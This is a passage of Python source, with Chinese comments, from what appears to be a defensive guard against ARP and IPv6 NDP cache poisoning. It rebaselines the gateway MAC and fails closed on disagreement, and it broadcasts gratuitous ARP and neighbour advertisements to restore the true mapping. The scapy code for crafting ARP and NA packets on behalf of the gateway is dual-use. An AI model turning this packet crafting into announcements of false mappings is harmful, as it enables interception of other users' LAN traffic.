                    # 纠正反复不生效：要么攻击者持续投毒，要么基准已过时
                    # （路由器已更换）。重估基准，避免把新真实网关"纠正"回旧 MAC。
                    self._rebaseline()

        self._maybe_v6(v6)

    def _rebaseline(self):
        """重估守护基准（网络切换 / 纠正反复不生效时调用）。

        对抗性设计：绝不因「单次实时询问与基准不同」就采纳新 MAC ——
        实时询问本身可能被攻击者抢答毒化，采纳等于自伤。
        仍沿用启动时的完整流程：缓存与实时**一致**才采纳；
        分歧或不可达一律 fail closed（暂停纠正），并明确告知用户。
        """
        LOG.emit("warn", "守护：正在重估基准（网络切换或纠正反复不生效）…")
        base = self._establish_baseline(strict=True)
        with self._lock:
            self._failed_corr = 0
            if base and base != self._gw_mac:
                self._gw_mac = base
                self._consecutive = 0
                self._v6 = None   # 旧 IPv6 上下文属于旧网络，作废待扫描重注入
                self._last_action = f"基准已更新：{self._gw_ip} → {base}"
                LOG.emit("ok", f"守护基准已更新：网关 {self._gw_ip} → {base}")
            elif not base:
                self._gw_mac = ""
                self._v6 = None
                self._last_action = "基准重估失败，暂停纠正（fail closed）"
                LOG.emit("warn",
                         "守护基准重估失败（缓存/实时分歧或不可达），"
                         "暂停发包避免钉死错误映射（fail closed）")
            else:
                self._consecutive = 0
                self._last_action = "基准复核一致，继续守护"

    def _maybe_v6(self, v6):
        """IPv6 重宣告 + best-effort 监控，约每 10 秒一次（避免过于频繁）。"""
        if not v6:
            return
        self._v6_counter += 1
        every = max(1, round(10.0 / self.interval))
        if self._v6_counter % every != 0:
            return
        gw_lla, gw_mac, my_lla, _iface = v6
        try:
            import ipv6 as _v6mod
            # best-effort 监控：本机 NDP 缓存里网关 LLA 的 MAC 是否被改
            # （ndp_table 返回的 key 一律为小写去 zone，比对前先归一化）
            tbl = _v6mod.ndp_table()
            key = gw_lla.split("%")[0].lower()
            cur = (tbl.get(key) or "").lower()
            if cur and cur != gw_mac.lower():
                LOG.emit("warn",
                         f"检测到网关 IPv6 映射漂移：{gw_lla} 缓存 {cur} ≠ 真实 {gw_mac}，"
                         f"疑似 NDP 投毒，已自动纠正")
                with self._lock:
                    self.anomaly_count += 1
                    self.last_anomaly_time = time.time()
            # 重宣告真实映射：L3 源是网关 LLA（属实），L2 源用本机 MAC（不冒充网关）
            na = _v6mod.build_na(
                eth_src=self.ni.my_mac, eth_dst=self.ni.my_mac,
                ipv6_src=gw_lla, ipv6_dst=my_lla,
                tgt=gw_lla, lladdr=gw_mac, solicited=0)
            self._send_v6(na)
        except Exception as e:
            LOG.emit("debug", f"IPv6 守护处理失败：{e}")

    # --- 发包（仅真实网关映射）---

    def _reassert(self, reason: str):
        """向全网重新宣告网关的真实 MAC，把被篡改的缓存纠正回来。"""
        code, _ = l2_check()
        if code != "ok":
            with self._lock:
                self._last_action = f"[{reason}] 二层不可用，跳过发包"
            return
        s = scapy_mod()
        if s is None:
            return
        my_mac = (self.ni.my_mac or "").lower()
        if not _MAC_RE.match(my_mac) or not _MAC_RE.match(self._gw_mac):
            with self._lock:
                self._last_action = f"[{reason}] MAC 无效，跳过"
            return
        # 免费 ARP：向全网宣告「网关 IP 的真实 MAC」（仅这条真实映射）。
        # 注意：L2 源用「本机 MAC」而非网关 MAC —— 我们只是纠正缓存，
        # 不冒充网关在二层出现，避免触发交换机端口安全/MAC 翻动告警。
        pkt = (s.Ether(dst=BROADCAST, src=my_mac) /
               s.ARP(op=2, hwsrc=self._gw_mac, psrc=self._gw_ip,
                     hwdst=my_mac, pdst=self._gw_ip))
        if self.dry_run:
            with self._lock:
                self._last_action = f"[演练] 宣告 {self._gw_ip} → {self._gw_mac}（{reason}）"
            LOG.emit("debug",
                     f"[演练] 守护宣告：{self._gw_ip} 的真实 MAC 是 {self._gw_mac}（{reason}）")
            return
        try:
            s.sendp(pkt, iface=self.ni.iface, verbose=0, count=2)
            with self._lock:
                self._last_action = f"纠正：{self._gw_ip} → {self._gw_mac}（{reason}）"
            LOG.emit("ok", f"已重新宣告网关真实 MAC，纠正缓存（{reason}）")
        except Exception as e:
            LOG.emit("warn", f"守护宣告失败：{e}")

    def _send_v6(self, pkt):
        code, _ = l2_check()
        if code != "ok":
            return
        s = scapy_mod()
        if s is None:
            return
        if self.dry_run:
            LOG.emit("debug", "[演练] 守护 IPv6 重宣告（网关真实映射）")
            return
        try:
            s.sendp(pkt, iface=self.ni.iface, verbose=0, count=1)
        except Exception as e:
            LOG.emit("debug", f"守护 IPv6 发送失败：{e}")


# ------------------------------------------------------------------ 单实例锁


class SingleInstance:
    """用本地端口做互斥，避免两个实例互相覆盖状态文件。"""

    def __init__(self, port: int = LOCK_PORT):
        self.port = port
        self.sock: socket.socket | None = None

    def acquire(self) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if WINDOWS:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_EXCLUSIVEADDRUSE, 1)
            else:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)
            s.bind(("127.0.0.1", self.port))
            s.listen(1)
            self.sock = s
            return True
        except OSError:
            return False

    def release(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None
